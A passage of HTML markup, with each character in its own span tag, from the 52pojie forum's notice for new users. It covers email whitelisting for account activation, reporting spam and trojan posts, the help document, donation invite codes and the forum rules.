inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">将</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">箱</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">白</span><span style="display: inline-block; text-indent: initial;">名</span><span style="display: inline-block; text-indent: initial;">单</span><span style="display: inline-block; text-indent: initial;">中</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">便</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">准</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">无</span><span style="display: inline-block; text-indent: initial;">误</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">收</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">送</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">件</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">只</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">通</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">件</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">才</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">正</span><span style="display: inline-block; text-indent: initial;">常</span><span style="display: inline-block; text-indent: initial;">访</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">回</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">下</span><span style="display: inline-block; text-indent: initial;">载</span><span style="display: inline-block; text-indent: initial;">附</span><span style="display: inline-block; text-indent: initial;">件</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">否</span><span style="display: inline-block; text-indent: initial;">则</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">被</span><span style="display: inline-block; text-indent: initial;">很</span><span style="display: inline-block; text-indent: initial;">快</span><span style="display: inline-block; text-indent: initial;">清</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">掉</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">如</span><span style="display: inline-block; text-indent: initial;">何</span><span style="display: inline-block; text-indent: initial;">操</span><span style="display: inline-block; text-indent: initial;">作</span><span style="display: inline-block; text-indent: initial;">具</span><span style="display: inline-block; text-indent: initial;">体</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">看</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">件</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">验</span><span style="display: inline-block; text-indent: initial;">证</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">题</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">子</span></span></strong><span style="display: inline-block; text-indent: initial;">：</span></span><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">:</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">j</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">n</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">r</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">a</span><span style="display: inline-block; text-indent: initial;">d</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">9</span><span style="display: inline-block; text-indent: initial;">8</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">8</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">l</span></span></p></li></ol><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">举</span><span style="display: inline-block; text-indent: initial;">报</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">奖</span></h2><p style="margin-bottom: 0px; color: rgb(53, 53, 53);"><span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">众</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">热</span><span style="display: inline-block; text-indent: initial;">心</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">员</span><span style="display: inline-block; text-indent: initial;">积</span><span style="display: inline-block; text-indent: initial;">极</span><span style="display: inline-block; text-indent: initial;">举</span><span style="display: inline-block; text-indent: initial;">报</span><span style="display: inline-block; text-indent: initial;">违</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">行</span><span style="display: inline-block; text-indent: initial;">为</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">协</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">管</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">团</span><span style="display: inline-block; text-indent: initial;">队</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">工</span><span style="display: inline-block; text-indent: initial;">作</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">斑</span><span style="display: inline-block; text-indent: initial;">竹</span><span style="display: inline-block; text-indent: initial;">巡</span><span style="display: inline-block; text-indent: initial;">查</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">辛</span><span style="display: inline-block; text-indent: initial;">勤</span><span style="display: inline-block; text-indent: initial;">管</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">下</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">日</span><span style="display: inline-block; text-indent: initial;">益</span><span style="display: inline-block; text-indent: initial;">恢</span><span style="display: inline-block; text-indent: initial;">复</span><span style="display: inline-block; text-indent: initial;">正</span><span style="display: inline-block; text-indent: initial;">常</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">但</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">灌</span><span style="display: inline-block; text-indent: initial;">水</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">冒</span><span style="display: inline-block; text-indent: initial;">充</span><span style="display: inline-block; text-indent: initial;">别</span><span style="display: inline-block; text-indent: initial;">人</span><span style="display: inline-block; text-indent: initial;">作</span><span style="display: inline-block; text-indent: initial;">品</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">甚</span><span style="display: inline-block; text-indent: initial;">至</span><span style="display: inline-block; text-indent: initial;">投</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">木</span><span style="display: inline-block; text-indent: initial;">马</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">还</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">层</span><span style="display: inline-block; text-indent: initial;">出</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">穷</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">虽</span><span style="display: inline-block; text-indent: initial;">然</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">很</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">反</span><span style="display: inline-block; text-indent: initial;">病</span><span style="display: inline-block; text-indent: initial;">毒</span><span style="display: inline-block; text-indent: initial;">工</span><span style="display: inline-block; text-indent: initial;">程</span><span style="display: inline-block; text-indent: initial;">师</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">管</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">团</span><span style="display: inline-block; text-indent: initial;">队</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">但</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">力</span><span style="display: inline-block; text-indent: initial;">量</span><span style="display: inline-block; text-indent: initial;">还</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">远</span><span style="display: inline-block; text-indent: initial;">远</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">够</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">这</span><span style="display: inline-block; text-indent: initial;">里</span><span style="display: inline-block; text-indent: initial;">需</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">家</span><span style="display: inline-block; text-indent: initial;">都</span><span style="display: inline-block; text-indent: initial;">参</span><span style="display: inline-block; text-indent: initial;">与</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">秩</span><span style="display: inline-block; text-indent: initial;">序</span><span style="display: inline-block; text-indent: initial;">维</span><span style="display: inline-block; text-indent: initial;">护</span><span style="display: inline-block; text-indent: initial;">中</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">维</span><span style="display: inline-block; text-indent: initial;">护</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">秩</span><span style="display: inline-block; text-indent: initial;">序</span><span style="display: inline-block; text-indent: initial;">人</span><span style="display: inline-block; text-indent: initial;">人</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">责</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">尽</span><span style="display: inline-block; text-indent: initial;">自</span><span style="display: inline-block; text-indent: initial;">己</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">份</span><span style="display: inline-block; text-indent: initial;">力</span><span style="display: inline-block; text-indent: initial;">量</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">帮</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">维</span><span style="display: inline-block; text-indent: initial;">护</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">秩</span><span style="display: inline-block; text-indent: initial;">序</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">现</span><span style="display: inline-block; text-indent: initial;">违</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">子</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">投</span><span style="display: inline-block; text-indent: initial;">诉</span><span style="display: inline-block; text-indent: initial;">举</span><span style="display: inline-block; text-indent: initial;">报</span><span style="display: inline-block; text-indent: initial;">区</span><span style="display: inline-block; text-indent: initial;">投</span><span style="display: inline-block; text-indent: initial;">诉</span><span style="display: inline-block; text-indent: initial;">举</span><span style="display: inline-block; text-indent: initial;">报</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">:</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">j</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">n</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">f</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">r</span><span style="display: inline-block; text-indent: initial;">u</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">l</span></span></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">站</span><span style="display: inline-block; text-indent: initial;">点</span><span style="display: inline-block; text-indent: initial;">帮</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">文</span><span style="display: inline-block; text-indent: initial;">档</span></h2><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span style="font-size: 14px;"><strong><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">题</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">般</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">这</span><span style="display: inline-block; text-indent: initial;">里</span><span style="display: inline-block; text-indent: initial;">都</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">找</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">！</span></strong><strong><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">:</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">j</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">n</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">?</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">d</span><span style="display: inline-block; text-indent: initial;">=</span><span style="display: inline-block; text-indent: initial;">f</span><span style="display: inline-block; text-indent: initial;">a</span><span style="display: inline-block; text-indent: initial;">q</span></strong></span></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">相</span><span style="display: inline-block; text-indent: initial;">关</span><span style="display: inline-block; text-indent: initial;">说</span><span style="display: inline-block; text-indent: initial;">明</span></h2><ul class="list-paddingleft-1" style="padding-left: 0px; color: rgb(53, 53, 53);"><li><p><span style="color: rgb(255, 0, 0); font-size: 14px;"><span style="display: inline-block; text-indent: initial;">对</span><span style="display: inline-block; text-indent: initial;">于</span><span style="display: inline-block; text-indent: initial;">通</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">捐</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">获</span><span style="display: inline-block; text-indent: initial;">取</span><span style="background-color: rgb(255, 255, 0);"><span style="display: inline-block; text-indent: initial;">邀</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">码</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span></span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">同</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">说</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">赠</span><span style="display: inline-block; text-indent: initial;">送</span><span style="display: inline-block; text-indent: initial;">9</span><span style="display: inline-block; text-indent: initial;">6</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">币</span><span style="display: inline-block; text-indent: initial;">价</span><span style="display: inline-block; text-indent: initial;">值</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">元</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">而</span><span style="display: inline-block; text-indent: initial;">且</span><span style="display: inline-block; text-indent: initial;">免</span><span style="display: inline-block; text-indent: initial;">受</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">跃</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">户</span><span style="display: inline-block; text-indent: initial;">清</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">风</span><span style="display: inline-block; text-indent: initial;">险</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">这</span><span style="display: inline-block; text-indent: initial;">点</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">同</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">滴</span><span style="display: inline-block; text-indent: initial;">。</span></span></p></li><li><p><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">先</span><span style="display: inline-block; text-indent: initial;">自</span><span style="display: inline-block; text-indent: initial;">己</span><span style="display: inline-block; text-indent: initial;">阅</span><span style="display: inline-block; text-indent: initial;">读</span><span style="display: inline-block; text-indent: initial;">【</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">总</span><span style="display: inline-block; text-indent: initial;">版</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">】</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">[</span><span style="display: inline-block; text-indent: initial;">让</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">快</span><span style="display: inline-block; text-indent: initial;">速</span><span style="display: inline-block; text-indent: initial;">融</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">家</span><span style="display: inline-block; text-indent: initial;">庭</span><span style="display: inline-block; text-indent: initial;">]</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">这</span><span style="display: inline-block; text-indent: initial;">样</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">于</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">更</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">融</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">:</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">j</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">n</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">r</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">a</span><span style="display: inline-block; text-indent: initial;">d</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">4</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">6</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">l</span></span></p></li><li><p><span style="background-color: rgb(255, 255, 0); font-size: 14px;"><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">并</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">意</span><span style="display: inline-block; text-indent: initial;">味</span><span style="display: inline-block; text-indent: initial;">着</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">已</span><span style="display: inline-block; text-indent: initial;">经</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">这</span><span style="display: inline-block; text-indent: initial;">仅</span><span style="display: inline-block; text-indent: initial;">仅</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">第</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">步</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; 